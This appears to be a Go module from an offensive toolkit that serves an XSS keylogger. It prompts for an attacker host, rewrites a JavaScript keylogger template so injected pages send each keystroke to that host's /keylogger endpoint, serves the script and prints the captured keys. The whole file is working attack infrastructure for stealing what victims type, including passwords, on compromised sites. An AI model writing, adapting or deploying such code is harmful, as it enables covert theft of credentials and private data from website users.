package modules

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

//XSSServer ...
func XSSServer(port string) {
	var lhost string
	fmt.Printf("LHost: ")
	fmt.Scanf("%s", &lhost)
	configHost(lhost, port)

	fs := http.FileServer(http.Dir("./modules/xss"))
	http.Handle("/", fs)
	http.HandleFunc("/keylogger", logger)
	log.Println("[*]Execução do servidor na porta " + port)
	http.ListenAndServe(":"+port, nil)
}

func logger(w http.ResponseWriter, r *http.Request) {
	key, _ := r.URL.Query()["key"]
	skey := key[0]
	fmt.Printf(skey)
}

func configHost(lhost, port string) {
	input, _ := ioutil.ReadFile("./modules/xss/keyloggerBase.js")
	lines := strings.Split(string(input), "\n")
	lines[0] = "const url = 'http://" + lhost + ":" + port + "/keylogger?key='"
	output := strings.Join(lines, "\n")
	err := ioutil.WriteFile("./modules/xss/keylogger.js", []byte(output), 0644)
	if err != nil {
		log.Fatalln(err)
	}
}
